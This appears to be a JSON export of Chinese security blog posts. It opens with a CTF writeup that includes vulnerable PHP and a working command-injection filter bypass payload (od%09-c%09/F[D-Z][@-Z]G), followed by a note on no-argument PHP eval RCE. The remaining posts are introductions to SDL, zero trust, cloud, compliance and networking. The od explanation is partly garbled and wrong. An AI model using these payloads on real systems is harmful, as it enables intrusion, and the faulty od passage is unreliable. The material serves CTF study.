((!preg_match(&#x27;/lv100/i&#x27;,$level)) &amp;&amp; (preg_match(&#x27;/lv100/i&#x27;,escapeshellarg($level))))&#123;            echo file_get_contents(&#x27;./hint.php&#x27;);        &#125;        break;    case &#x27;squirtle&#x27;:        echo md5(&#x27;jienijieni!&#x27;).md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]);        break;    case &#x27;mewtwo&#x27;:        $dream = $_POST[&quot;dream&quot;] ?? &quot;&quot;;        if(strlen($dream)&gt;=20)&#123;            die(&quot;So Big Pokenmon!&quot;);        &#125;        ghostpokemon($dream);        echo shell_exec($dream);&#125;?&gt; \n\n代码审计\n最近有点浮躁，这个现在开始慢慢写题，一定要吃透\n这里有一个escapeshellarg函数，用p神文章学习\nhttps://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html\nhttps://blog.csdn.net/qq_43085611/article/details/119523915\nescapeshellarg 利用的关键点：\n\n参数注入：当开发人员错误的使用，可能导致代码执行。\n代码执行：去掉字符串中的不可见字符。\n\nif ((!preg_match(&#x27;/lv100/i&#x27;,$level)) &amp;&amp; (preg_match(&#x27;/lv100/i&#x27;,escapeshellarg($level))))&#123;            echo file_get_contents(&#x27;./hint.php&#x27;);        &#125;\n\n这里有一个利用的条件，没有lv100，但是经过escapeshellarg处理，得有lv100，\n这个函数的作用有去掉字符串中的不可见字符\n好的输入一个\nlv%FF100\nhint\n\n\n然后就是命令执行\n因为我们常见的命令执行都已经被过滤了\n“od” 是 Unix &#x2F; Linux 操作系统中的一个命令，用于将文件或输入流中的数据转换为八进制、十六进制或其他格式的可打印 ASCII 字符表示。它通常用于查看二进制文件的内容、比较不同版本的文件，或者将二进制数据转换为可读的字符。\n“od” 命令可以接受多种参数和选项，以便将数据转换为不同的格式。例如，使用 “-c” 选项可以将数据转换为可打印的 ASCII 字符表示，而使用 “-x” 选项可以将数据转换为十六进制格式。\n下面是一个使用 “od” 命令将文件内容转换为八进制格式的示例：\nod -b /path/to/file\n\n在这个示例中，我们使用 “od” 命令将 “&#x2F;path&#x2F;to&#x2F;file” 文件的内容转换为八进制格式，并在命令行终端中输出结果。输出结果类似于下面这样：\napache\n0000000 211 114 105 116 101  040 104 79  114  102  041 其中，每一行表示文件的一部分内容，第一列是该部分内容在文件中的偏移量（以八进制格式表示），后面的列是该部分内容的八进制表示。在这个示例中，第一行的八进制表示为 &quot;211 114 105 116 101 040 104 79 114 102 041&quot;，对应的 ASCII 字符为 &quot;# Linux ELF&quot;。在本例中，攻击者可以使用 &quot;od&quot; 命令来执行任意命令，因为黑名单过滤器没有过滤掉 &quot;od&quot; 字符串。攻击者可以使用 &quot;-c&quot; 选项将文件内容转换为可打印 ASCII 字符表示，并将其输出到命令行终端中，从而执行任意命令。这种漏洞称为命令执行绕过漏洞，是一种常见的安全问题。\n\n这里传入的内容长度不能超过20个字符，然后经过一个黑名单过滤，最后会放入到shell_exec()执行。我们查看黑名单中的字符，发现od并没有过滤，使用od -c命令也能读取文件内容，example:\n# od -c /flag0000000   f   l   a   g   &#123;   s   u   c   c   e   s   s   !   &#125;  \\n0000017\n\n然后就是构造出 FLAG 字符串，这里用到了[]通配的形式，由于黑名单中有A和L这两个字符，因此构造F[D-Z][@-Z]G，这样就能匹配上ASCII表中的@到Z之间的所有字符。\n这种[]通配符还是很少见的，当?和*被ban了之后还是很好用的\n最后是空格的绕过，这里用到了%09\npayload：myfavorite=mewtwo&amp;dream=od%09-c%09/F[D-Z][@-Z]G\n\n会出来flag\n\n\n但是这样格式是不对的\n\n我测试了一下这样是有地址的，所以我们需要删除0000020和00000040\nok\n[强网杯 2019]高明的黑客跑脚本的以前复现过现在不搞了\n[强网杯 2019]upload环境是坏的，文件传不上去\n","categories":["writeups"],"tags":["文件上传","sql","堆叠注入","od"]},{"title":"无参数rce","url":"/2023/05/11/%E6%97%A0%E5%8F%82%E6%95%B0rce/","content":"前言在鹏程杯中发现有无参数rce，发现自己基础很差很差，特此学习记录一下。参考文文章：https://a1andns.github.io/post/%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE\n使用无参数函数的原因这里是因为有很离谱的过滤\n原本正常来说我们看到eval($_POST[‘cmd’]);\n就可以传入利用了，但是这里前面加上了这样的过滤\nif(&#x27;;&#x27; === preg_replace(&#x27;/[^\\W]+\\((?R)?\\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;cmd&#x27;])) &#123;        eval($_GET[&#x27;cmd&#x27;]);&#125;\n\n\n(?R)?尤其注意这个特征点，是一个递归的匹配\n如果输入的是system(‘ls’)这样的有参数函数，正则匹配就会匹配不到，从而没有替换为空，那么&#x3D;&#x3D;&#x3D;’;’的条件就无法满足。\n只有a();、a(b(c()));这样的格式才能够被匹配。\n上面这个正则就是明显的过滤参数，只允许无参数函数的表现。\n超级全局变量PHP中预定义了几个超级全局变量（superglobals） ，这意味着它们在一个脚本的全部作用域中都可用。 你不需要特别说明，就可以在函数及类中使用。\nPHP 超级全局变量列表:$GLOBALS$_SERVER$_REQUEST$_POST$_GET$_FILES$_ENV$_COOKIE$_SESSION\n\n注意一个超级全局变量$_ENV\n这可以当作是一个环境变量的集合\n这里面有很多可以使用的无参函数\ngetenv()\narray_rand()\narray_filp()\n等等\n注意一个\ngetallheaders()\n这个可以获得所有的消息头信息\n&lt;?phpvar_dump(getallheaders());?&gt;结果：array(13) &#123;  [&quot;Content-Length&quot;]=&gt;  string(1) &quot;0&quot;  [&quot;Cookie&quot;]=&gt;  string(85) &quot;_ga=GA1.1.125883784.1603376093; Phpstorm-b0ddb94=486c1e0a-aca9-446a-ad57-e43c4cbfd510&quot;  [&quot;Accept-Language&quot;]=&gt;  string(47) &quot;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&quot;  [&quot;Accept-Encoding&quot;]=&gt;  string(17) &quot;gzip, deflate, br&quot;  [&quot;Sec-Fetch-Dest&quot;]=&gt;  string(8) &quot;document&quot;  [&quot;Sec-Fetch-User&quot;]=&gt;  string(2) &quot;?1&quot;  [&quot;Sec-Fetch-Mode&quot;]=&gt;  string(8) &quot;navigate&quot;  [&quot;Sec-Fetch-Site&quot;]=&gt;  string(4) &quot;none&quot;  [&quot;Accept&quot;]=&gt;  string(124) &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;  [&quot;User-Agent&quot;]=&gt;  string(131) &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36 Edg/86.0.622.51&quot;  [&quot;Upgrade-Insecure-Requests&quot;]=&gt;  string(1) &quot;1&quot;  [&quot;Host&quot;]=&gt;  string(15) &quot;localhost:63342&quot;  [&quot;Content-Type&quot;]=&gt;  string(0) &quot;&quot;&#125;---------------------------------Author: A1andNSArticle is from: https://a1andns.github.io/post/%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCEThis content is shared under the CC BY-NC-SA 4.0 protocol (Non-Commercial)\n\n这样我们可以加入我们的恶意代码\n\n","categories":["知识总结"],"tags":["无参RCE"]},{"title":"沙箱初识","url":"/2023/08/07/%E6%B2%99%E7%AE%B1%E5%88%9D%E8%AF%86/","content":"定义沙箱：是桌面运行环境的虚拟镜像系统，用来深度检测可疑文件。当对未知的可疑文件分析时，有时我们需要实际运行它，并记录他的一切行为，进而对其进行分析，就需要用到沙箱。\n（1）沙箱是桌面运行环境的虚拟镜像系统，包括：配置、驱动、应用、语言；\n（2）接受来自安全联动产品的可疑对象：例如可疑URL、文档文件、可执行文件；\n（3）可以自动执行针对可疑文件及URL的分析检测；\n（4）生成详细的报告，并告知不同的风险级别。\n沙箱优势1.经济便携\n2.高度可视化\n沙箱制作原理沙箱内万物基于重定向\n重定向，就是重新指定方向，沙箱能够做到让沙箱内软件的操作的文件，注册表等重要路径重定向到其他地方，你想操作资源不可以\n这个重定向是怎么做到的呢？\n看段代码\nNTSTATUS HOOK_ZwDeleteFile(  POBJECT_ATTRIBUTES ObjectAttributes) &#123;   AddPrefix(ObjectAttributes-&gt;ObjectName, L&quot;sandbox&quot;);//路径加上沙箱前缀   if(!PathFileExists(ObjectAttributes-&gt;ObjectName.Buffer)) &#123;      CopyFile();//拷贝进来   &#125;   return OrigZwDeleteFile(ObjectAttributes);&#125;\n\n简单来说就是在文件的前面加一个sandbox路径\n一个完备的沙箱一般需要虚拟化（隔离）处理这些东西：\n\n文件\n注册表\nDCOM(RPCSS)\n服务\n其他如：窗口、类名、消息、token等。\n进程、线程安全\n全局钩子、注入等防护\n驱动加载\n\n","categories":["工作"],"tags":["work"]},{"title":"浅谈Devops","url":"/2023/08/07/%E6%B5%85b%E8%B0%88Devops/","content":"定义DevOps（Development和Operations的组合词）是一种重视“软件开发人员（Dev）”和“IT运维技术人员（Ops）”之间沟通合作的文化、运动或惯例。透过自动化“软件交付”和“架构变更”的流程，来使得构建、测试、发布软件能够更加地快捷、频繁和可靠。\n思考在我眼中这里更像是一种开发方式，Devops不是简单的一个软件，几个人就做出来的，它应该是一种思想观察到开发的全过程中\n这个过程中有很多厂商都做出了很多优质平台\n软件开发的发展大概是从瀑布式到敏捷式再到现在的Devops\nDevops大概是在一个平台上，所有的设计，开发，测试，发布所有人都在一个规范下进行活动，严格按照规范进行项目推进\n","categories":["工作"],"tags":["work"]},{"title":"网络安全基础知识-SDL浅谈","url":"/2023/08/08/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-SDL%E6%B5%85%E8%B0%88/","content":"SDL简介SDL security development lifecycle（安全开发生命周期），是微软提出的从安全角度指导软件开发过程的管理模式，SDL是一个安全保证的过程,重点是软件开发，所有阶段都引入的安全和隐私的原则。\nSDL中的方法，试图从安全漏洞的产生根源上解决问题，通过对软件工程的控制，保证产品的安全性\nSDL阶段1.培训开发团队所有成员都必须接收适当的安全培训，包括开发人员，测试人员，项目经理，产品经理\n2.安全要求提前和项目经理等等人确定安全的要求和需要做的事情，确定项目计划，和里程碑，尽量避免因为安全问题出现意外\n3.质量门项目的最低安全要求\n4.安全和隐私风险评估必须的\n比如威胁模型，安全设计评析，范围，等等\n阶段5：设计要求在设计阶段应仔细考虑安全和隐私问题，在项目初期确定好安全需求，尽可能避免安全引起的需求变更。\n阶段6：减小攻击面减小攻击面与威胁建模紧密相关，不过它解决安全问题的角度稍有不同。减小攻击面通过减小攻击者利用潜在弱点或漏洞的机会来降低风险，减小攻击面包括：关闭或限制对系统服务的访问，应用“最小权限原则”，以及尽可能进行分层防御。\n阶段7：威胁建模为项目或产品面临的威胁建立模型，明确可能来自的攻击有哪些方面。\n阶段8：使用指定的工具开发团队使用的编辑器、链接器等相关工具，可能会涉及一些安全相关的环节，因此在使用工具的版本上，需要提前与安全团队进行沟通。\n阶段9：弃用不安全函数许多常用函数可能存在安全隐患，应当禁用不安全的函数和API，使用安全团队推荐的函数。\n阶段10：静态分析代码静态分析可以由相关工具辅助完成，其结果与人工分析相结合。\n阶段11：动态程序分析动态分析是静态分析的补充，用于测试环节验证程序的安全性。\n阶段12：模糊测试（Fuzzing Test）模糊测试是一种专门形式的动态分析，它通过故意向应用程序引入不良格式或随机数据诱发程序故障。模糊测试策略的制定，以应用程序的预期用途，以及应用程序的功能和设计规范为基础。安全顾问可能要求进行额外的模糊测试，或者扩大模糊测试的范围和增加持续时间。\n阶段13：威胁模型和攻击面评析项目经常会因为需求等因素导致最终的产出偏离原本设定的目标，因此在项目后期对威胁模型和攻击面进行评析是有必要的，能够及时发现问题并修正。\n阶段14：事件响应计划受SDL要求约束的每个软件在发布时都必须包含事件响应计划。即使在发布时不包含任何已知漏洞的产品，也可能在日后面临新出现的威胁。需要注意的是，如果产品中包含第三方的代码，也需要留下第三方的联系方式并加入事件响应计划，以便在发生问题时能够找到对应的人。\n阶段15：最终安全评析最终安全评析（FSR）是在发布之前仔细检查对软件执行的所有安全活动。通过FSR将得出以下三种不同不同结果。\n1、 通过FSR。在FSR过程中确定所有安全和隐私问题都已得到修复或缓解。\n2、 通过FSR但有异常。在FSR过程中确定所有安全和隐私问题都已得到修复或缓解，并且&#x2F;或者所有异常都已得到圆满解决。无法解决的问题将记录下来，在下次发布时更正。\n3、 需上报问题的FSR。如果团队未满足所有SDL要求，并且安全顾问和产品团队无法达成可接受的折中，则安全顾问不能批准项目，项目不能发布。团队必须在发布之前解决所有可解决的问题，或者上报高级管理层进行抉择。\n阶段16：发布&#x2F;存档在通过FSR或者虽有问题但达成一致后，可以完成产品的发布。但发布的同时仍需对各种问题和文档进行存档，为紧急响应和产品升级提供帮助。\n从以上的过程可以看出，微软的SDL的过程实施非常细致。微软这些年来也一直帮助公司的所有产品团队，以及合作伙伴实施SDL，效果相当显著。\n","categories":["工作"],"tags":["work","网络安全基础知识"]},{"title":"网络安全基础知识-云服务器云盘云原生","url":"/2023/08/11/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BA%91%E7%9B%98/","content":"什么是云云实质上是一种连接机制，它可以让你在任何地方管理和存储数据，使用互联网访问大型数据中心的服务器，简单来说就是其他人的电脑。云服务是指由第三方提供商托管的基础架构、平台或软件，通过互联网提供给用户。 \n云服务有助于用户数据从前端客户端（诸如用户的服务器、平板电脑、台式机、笔记本电脑等任何用户端设备）通过互联网流向提供商的系统，然后再返回。云服务促进了云原生应用的构建和在云端工作的灵活性。用户只需借助计算机、操作系统和互联网连接即可访问云服务。\n企业为什么要上云随着科技的进步和发展，网络也在不断升级改造，由原始的2G,3G,4G到现在正要普及的5G。一切都是在更好更便捷的方向提升优化，企业的管理上也是在不断升级，不断便利化发展。\n从企业自身需求来讲：\n\\1. 自身发展难题，产生上云需求。对大部分企业而言，使用云计算服务多是因为IT系统及基础设施的更新换代、IT成本居高不下资源利用率低、IT资源管理困难、安全程度低等原因。\n无法支撑自己企业的进一步发展，上云寻突破。\n\\2. 互联网转型，产生上云需求。工业互联网作为新一代信息技术与工业系统深度融合的产物，日益成为实现生产制造领域全要素、全产业链、全价值链连接的关键支撑和工业经济数字口网络化、智能化的重要基础设施。\n什么是云原生（CloudNative）4个要点：DevOps+持续交付+微服务+容器。\n\n","categories":["工作"],"tags":["work","网络安全基础知识"]},{"title":"网络安全基础知识-等保是什么","url":"/2023/08/07/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-%E7%AD%89%E4%BF%9D%E6%98%AF%E4%BB%80%E4%B9%88/","content":"等保到底是什么？1、降低信息安全风险，提高信息系统的安全防护能力；\n2、满足国家相关法律法规和制度的要求；\n3、满足相关主管单位和行业要求；\n4、合理地规避或降低风险。\n等保具体包括什么内容(1)定级\n邀请几个网络安全专家，根据信息安全等级保护定级相关指南结合企业信息系统进行评估定级，并出具定级专家意见。\n\n(2)备案\n通过备案工具填写完整系统表单,然后将全部材料一起送到所在地市公安局网安支队进行备案，这个过程正常需要十个工作日完成。\n(3)安全建设整改\n根据客户的实际情况进行差距分析，针对不符合的项目以及行业特征进行整改。\n(4)信息安全等级测评\n信息系统安全等级测评是验证信息系统是否满足相应安全保护等级的评估过程。\n说人话就是，给客户打分，评分的。\n(5)信息安全检查\n根据客户需要配合完成的自查工作，按照规章制度的要求落实完成自查流程。\n等保分为几个级别\n什么群体&#x2F;行业需要开展等保（1）政府机关：电子政务网络；\n（2）金融行业：监管机构，银行，保险公司等；\n（3）电信行业：各大运营商；\n（4）能源行业：电力（比如xxx电网），石油等；\n（5）互联网单位：各大企业，上市公司等；\n","categories":["工作"],"tags":["work","网络安全基础知识"]},{"title":"网络安全基础知识-零信任","url":"/2023/08/10/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-%E9%9B%B6%E4%BF%A1%E4%BB%BB/","content":"什么是零信任？这里我们可以从vpn开始了解，我们平时用vpn是干嘛？接触自己接触不到的东西\n当我们挂了梯子之后仿佛一切都变得豁然开朗，访问什么东西都好像可以一样，这对于正常人来说，好像没什么，挺好的。但是对于企业来说，其实想一想是很容易出现危险的。\n一但员工的账户被盗用，利用他的vpn进入公司内网，几乎就是畅通无阻\n于是在这种考量的情况下，零信任出现了\n零信任（Zero Trust）最早是由约翰·金德瓦格（John Kindervag）担任Forrester Research副总裁兼首席分析师期间创建的。这是一次对传统安全模型假设的彻底颠覆。\n传统模型假设：组织网络内的所有事物都应受到信任。事实上，一旦进入网络，用户（包括威胁行为者和恶意内部人员）可以自由地横向移动、访问甚至泄露他们权限之外的任何数据。这显然是个很大的漏洞。\n零信任网络访问(Zero-Trust Network Access)则认为：不能信任出入网络的任何内容。应创建一种以数据为中心的全新边界，通过强身份验证技术保护数据。\n零信任是一种安全模型，基于访问主体身份、网络环境、终端状态等尽可能多的信任要素对所有用户进行持续验证和动态授权。零信任与传统的安全模型存在很大不同，传统的安全模型通过“一次验证+静态授权”的方式评估实体风险，而零信任基于“持续验证+动态授权”的模式构筑企业的安全基石。\n零信任核心原则\n持续验证，永不信任，构建身份安全基石\n零信任对人、终端和应用进行统一身份化管理，建立以身份为中心的访问控制机制。以访问主体的身份、网络环境、终端状态等作为认证的动态考量因素，持续监测访问过程中的违规和异常行为，确保接入网络的用户和终端持续可信。\n\n动态授权，精细访问控制，权限随需而动\n零信任不依赖通过网络层面控制访问权限，而是将访问目标的权限细化到应用级、功能级、数据级，只对访问主体开放所需的应用、功能或数据，满足最小权限原则，极大收缩潜在攻击面。同时安全控制策略基于访问主体、目标客体、环境属性（终端状态、网络风险、用户行为等）进行权限动态判定，实现应用、功能、数据等维度的精细和动态控制。\n\n全局防御，网安协同联动，威胁快速处置\n零信任通过对终端风险、用户行为异常、流量威胁、应用鉴权行为进行多方面评估，创建一条完整的信任链。并对信任分低的用户或设备生成相应的处置策略，联动网络或安全设备进行威胁快速处置，为企业搭建一张“零信任+网安联动”的安全网络。\n\n\n简单理解对于用户的访问，给与最小可以满足需求的权限，并且隐藏网关，让攻击者没有办法，要什么，经过认证，我再给你，即使受到攻击，内网横移等方式也不再存在，因为每个人都不再信任对方。\n参考\nhttps://zhuanlan.zhihu.com/p/381951884\nhttps://info.support.huawei.com/info-finder/encyclopedia/zh/%E9%9B%B6%E4%BF%A1%E4%BB%BB.html#:~:text=%E4%BB%80%E4%B9%88%E6%98%AF%E9%9B%B6%E4%BF%A1%E4%BB%BB%EF%BC%9F%20%E9%9B%B6%E4%BF%A1%E4%BB%BB%E6%98%AF%E4%B8%80%E7%A7%8D%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B%EF%BC%8C%E5%9F%BA%E4%BA%8E%E8%AE%BF%E9%97%AE%E4%B8%BB%E4%BD%93%E8%BA%AB%E4%BB%BD%E3%80%81%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83%E3%80%81%E7%BB%88%E7%AB%AF%E7%8A%B6%E6%80%81%E7%AD%89%E5%B0%BD%E5%8F%AF%E8%83%BD%E5%A4%9A%E7%9A%84%E4%BF%A1%E4%BB%BB%E8%A6%81%E7%B4%A0%E5%AF%B9%E6%89%80%E6%9C%89%E7%94%A8%E6%88%B7%E8%BF%9B%E8%A1%8C%E6%8C%81%E7%BB%AD%E9%AA%8C%E8%AF%81%E5%92%8C%E5%8A%A8%E6%80%81%E6%8E%88%E6%9D%83%E3%80%82%20%E9%9B%B6%E4%BF%A1%E4%BB%BB%E4%B8%8E%E4%BC%A0%E7%BB%9F%E7%9A%84%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B%E5%AD%98%E5%9C%A8%E5%BE%88%E5%A4%A7%E4%B8%8D%E5%90%8C%EF%BC%8C%E4%BC%A0%E7%BB%9F%E7%9A%84%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B%E9%80%9A%E8%BF%87,%E2%80%9C%E4%B8%80%E6%AC%A1%E9%AA%8C%E8%AF%81%2B%E9%9D%99%E6%80%81%E6%8E%88%E6%9D%83%E2%80%9D%20%E7%9A%84%E6%96%B9%E5%BC%8F%E8%AF%84%E4%BC%B0%E5%AE%9E%E4%BD%93%E9%A3%8E%E9%99%A9%EF%BC%8C%E8%80%8C%E9%9B%B6%E4%BF%A1%E4%BB%BB%E5%9F%BA%E4%BA%8E%20%E2%80%9C%E6%8C%81%E7%BB%AD%E9%AA%8C%E8%AF%81%2B%E5%8A%A8%E6%80%81%E6%8E%88%E6%9D%83%E2%80%9D%20%E7%9A%84%E6%A8%A1%E5%BC%8F%E6%9E%84%E7%AD%91%E4%BC%81%E4%B8%9A%E7%9A%84%E5%AE%89%E5%85%A8%E5%9F%BA%E7%9F%B3%E3%80%82\nhttps://zhuanlan.zhihu.com/p/102086374\n","categories":["工作"],"tags":["work","网络安全基础知识"]},{"title":"网络安全基础知识-静动态ip","url":"/2023/08/12/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-%E9%9D%99%E5%8A%A8%E6%80%81ip/","content":"","categories":["工作"],"tags":["work","网络安全基础知识"]},{"title":"网络安全知识基础-计网常识","url":"/2023/08/10/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E5%9F%BA%E7%A1%80-%E8%AE%A1%E7%BD%91%E5%B8%B8%E8%AF%86/","content":"前言这篇文章估计会很长，因为我在工作中发现自己对于计算机网络的东西真的知道的太少太少了，所以以后遇到不会的，或者说是知道但是不熟悉的计算机网络的知识点都会往这篇文章上面去放。希望可以持续更新，这篇文章也可以帮助我真正的成长。这里不会讲很多很复杂难懂的原理，我会尽量用自己的理解写下最简单易懂又实用的技术知识点。如果有错误，还望指正。\nip地址分类IP地址等于网络地址加上主机地址，网络地址表示其属于互联网的哪一个网络，主机地址表示其属于该网络中的哪一台主机。二者是主从关系。IP被分为A、B、C、D、E五类。\nip地址由4段组成，一段一个字节8位，所以有32位组成一个ip地址\n\nA类：（1.0.0.0-126.0.0.0）第一个字节为网络号，后三个字节为主机号。该类IP地址的最前面为“0”，所以地址的网络号取值于1~126之间。一般用于大型网络。\n​\t默认子网掩码：255.0.0.0或 0xFF000000\n​\t其中私有地址范围是：10.0.0.0～10.255.255.255\nB类：（128.0.0.0-191.255.0.0）前两个字节为网络号，后两个字节为主机号。该类IP地址的最前面为“10”，所以地址的网络号取值于128~191之间。一般用于中等规模网络。\n​\t默认子网掩码：255.255.0.0或0xFFFF0000\n​\t其中私有地址范围是：172.16.0.0～172.31.255.255\nC类：（192.0.0.0-223.255.255.0）前三个字节为网络号，最后一个字节为主机号。该类IP地址的最前面为“110”，所以地址的网络号取值于192~223之间。一般用于小型网络。\n​\t子网掩码：255.255.255.0或 0xFFFFFF00\n​\t其中私有地址范围是：192.168.0.0～192.168.255.255\n我们一般来说现在用的平时可以接触到的基本都是c类地址\nD类：是多播地址。该类IP地址的最前面为“1110”，所以地址的网络号取值于224~239之间。一般用于多路广播用户。\nE类：是保留地址。该类IP地址的最前面为“1111”，所以地址的网络号取值于240~255之间。\n​\t在这些IP地址中，按照用途的范围又可以分为公有地址和私有地址两大类，公用地址在Internet中使用，可以在Internet中随意访问。私有地址只能在内部网络中使用，只有通过代理服务器才能与Internet通信。使用保留地址的网络只能在内部进行通信，而不能与其他网络互连。因为本网络中的保留地址同样也可能被其它网络使用，如果进行网络互连，那么寻找路由时就会因为地址的不唯一而出现问题。\n​\t子网掩码的作用是计算网络标识，即IP地址 &amp; 子网掩码 &#x3D; 网络标识。\n\n网关大家都知道，从一个房间走到另一个房间，必然要经过一扇门。同样，从一个网络向另一个网络发送信息，也必须经过一道“关口”，这道关口就是网关。顾名思义，网关(Gateway)就是一个网络连接到另一个网络的“关口”。\n网关有两种，面向连接的和不面向连接的（这个不懂就remake吧）\n当两个子网之间有一定距离时，往往将一个网关分成两半，中间用一条链路连接起来，我们称之为半网关。\n按照不同的分类标准，网关也有很多种。TCP&#x2F;IP协议里的网关是最常用的，在这里我们所讲的“网关”均指TCP&#x2F;IP协议下的网关。\n例子网关实质上是一个网络通向其他网络的IP地址。比如有网络A和网络B，\n网络A的IP地址范围为“192.168.1.1~192. 168.1.254”，子网掩码为255.255.255.0；\n网络B的IP地为“192.168.2.1~192.168.2.254”，子网掩码为255.255.255.0。\n在没有路由器的情况下，两个网络之间是不能进行TCP&#x2F;IP通信的，即使是两个网络连接在同一台交换机(或集线器)上，TCP&#x2F;IP协议也会根据子网掩码(255.255.255.0)判定两个网络中的主机处在不同的网络里。而要实现这两个网络之间的通信，则必须通过网关。如果网络A中的主机发现数据包的目的主机不在本地网络中，就把数据包转发给它自己的网关，再由网关转发给网络B的网关，网络B的网关再转发给网络B的某个主机。\n默认网关如果搞清了什么是网关，默认网关也就好理解了。就好像一个房间可以有多扇门一样，一台主机可以有多个网关。默认网关的意思是一台主机如果找不到可用的网关，就把数据包发给默认指定的网关，由这个网关来处理数据包。现在主机使用的网关，一般指的是默认网关。\n网关工作原理例子　　假设你的名字叫小不点，你住在一个大院子里，你的邻居有很多小伙伴，在门口传达室还有个看大门的李大爷，李大爷就是你的网关。当你想跟院子里的某个小伙伴玩，只要你在院子里大喊一声他的名字，他听到了就会回应你，并且跑出来跟你玩。\n但是你不被允许走出大门，你想与外界发生的一切联系，都必须由门口的李大爷（网关）用电话帮助你联系。假如你想找你的同学小明聊天，小明家住在很远的另外一个院子里，他家的院子里也有一个看门的王大爷（小明的网关）。但是你不知道小明家的电话号码，不过你的班主任老师有一份你们班全体同学的名单和电话号码对照表，你的老师就是你的DNS服务器。于是你在家里拨通了门口李大爷的电话，有了下面的对话：\n小不点：李大爷，我想找班主任查一下小明的电话号码行吗？李大爷：好，你等着。（接着李大爷给你的班主任挂了一个电话，问清楚了小明的电话）问到了，他家的号码是211.99.99.99小不点：太好了！李大爷，我想找小明，你再帮我联系一下小明吧。李大爷：没问题。（接着李大爷向电话局发出了请求接通小明家电话的请求，最后一关当然是被转接到了小明家那个院子的王大爷那里，然后王大爷把电话给转到小明家）就这样你和小明取得了联系。\n网卡网卡又叫网络适配器，无论在哪一层，他都是充当计算机和数据的中间媒介。物理网卡不去讨论，主要研究一下虚拟网卡\n虚拟网卡虚拟网卡（Virtual Network Adapter 或 Virtual  NIC）是在软件中模拟的网络接口卡（NIC）。与物理网络接口卡一样，虚拟网卡也有其自己的 MAC 地址和 IP  地址。虽然它不是一个真实的、物理存在的设备，但操作系统和应用程序都会将其视为一个真实的网络接口。\n例子场景描述\n公司: 铁盾安全公司\n需求: 铁盾安全公司为其客户提供网络安全审计服务。为了模拟不同的网络攻击场景并测试客户的防御能力，他们需要在单一的物理服务器上创建多个独立的虚拟网络环境。\n虚拟网卡在此场景中的应用\n\n创建虚拟机: 为了模拟多个网络环境，铁盾使用 VMware 创建了四个虚拟机：Attack-VM1、Attack-VM2、Target-VM1 和 Target-VM2。\n配置虚拟网卡: 每个虚拟机都被分配了一个虚拟网卡。这些虚拟网卡具有与物理网络接口卡相似的功能，如分配IP地址、MAC地址等。\n隔离网络环境: 为了确保每个模拟攻击都在一个控制的环境中进行，铁盾决定将 Attack-VM1 和 Target-VM1 放在一个虚拟网络中，而 Attack-VM2 和 Target-VM2 放在另一个虚拟网络中。虚拟网卡的配置使这种隔离变得简单，因为它们可以轻松地指定哪些虚拟机可以互相通信。\n模拟攻击: 一旦虚拟网络环境准备好，铁盾的安全专家就可以开始模拟攻击。例如，他们可以使用 Attack-VM1 尝试攻击 Target-VM1，同时确保 Attack-VM2 和 Target-VM2 完全不受影响。\n网络流量捕获: 由于虚拟网卡完全在软件中模拟，铁盾可以轻松地捕获在其上的所有网络流量，用于后续的分析和报告。\n\n结论\n在这个场景中，铁盾安全公司利用虚拟网卡的功能在单一的物理服务器上创建了多个独立的虚拟网络环境。这使他们能够在控制的环境中模拟网络攻击，同时确保每个测试都不会影响其他虚拟网络或主机系统。虚拟网卡为他们提供了一个灵活且功能强大的工具，用于满足其特定的网络安全测试需求。\n再来一个熟悉一点的例子你正在使用你的个人计算机，上面安装了一个虚拟化软件（如 VMware 或 VirtualBox）来运行一个 Linux 虚拟机。你希望这个 Linux 虚拟机能够访问互联网，同时你的主机（宿主机）和虚拟机之间也能互相通信。\n虚拟网卡的角色：\n\n在宿主机上：当你创建虚拟机时，虚拟化软件会在宿主机上创建一个或多个虚拟网卡。这些虚拟网卡在操作系统中看起来就像真正的硬件设备，但实际上完全是由软件模拟的。\n在虚拟机内：虚拟机自己也会有一张虚拟网卡，它代表虚拟机与外界（可能是宿主机或其他网络）的连接点。\n\n常见的网络连接配置\n网络桥接模式：虚拟化软件会将虚拟机的虚拟网卡与宿主机的物理网卡“桥接”在一起。这意味着虚拟机可以像宿主机上的任何其他物理设备一样访问网络。它会从路由器或DHCP服务器获取自己的IP地址。\nNAT（网络地址转换）模式：虚拟机的所有网络流量都会通过宿主机的物理网卡传输，并使用宿主机的IP地址。这种方式下，虚拟机是不能被网络上的其他设备直接访问的，但它可以访问外部网络。\n主机模式：虚拟机只能与宿主机通信，不能与外部网络通信。这通常用于测试和隔离环境。\n\n\n这里我有用的一张无线网卡和一个虚拟网卡，剩下的未启用\n我看了看我的虚拟网卡的网络信息，同时我看看我的虚拟机kail的ip\n同一网段不同主机\n网卡重启命令\nsystemctl restart networking\n\nservice networking 